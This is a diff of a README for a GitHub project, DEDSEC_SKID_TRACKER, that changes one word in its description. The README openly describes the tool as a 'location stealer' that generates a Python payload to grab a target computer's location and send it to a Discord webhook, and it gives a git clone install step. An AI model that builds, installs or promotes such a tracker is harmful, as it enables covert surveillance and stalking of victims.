@@ -3,7 +3,7 @@
 <img src="https://github.com/0xbitx/DEDSEC_SKID_TRACKER/blob/main/banner.png", width="600", height="600">
 </p>
 <h1 align="center"> DEDSEC_SKID_TRACKER</h1>
-<h4 align="center"> DEDSEC_SKID_TRACKER is a linux based location stealer that creates a python payload which, when activated, get the actual location of the target computer and send to your discord server via webhook.</h4>
+<h4 align="center"> DEDSEC_SKID_TRACKER is a linux based location stealer that creates a python payload which, when activated, get the exact location of the target computer and send to your discord server via webhook.</h4>
 
 ### INSTALLATION [KALI - PARROT - TERMUX]
 * git clone https://github.com/0xbitx/DEDSEC_SKID_TRACKER.git
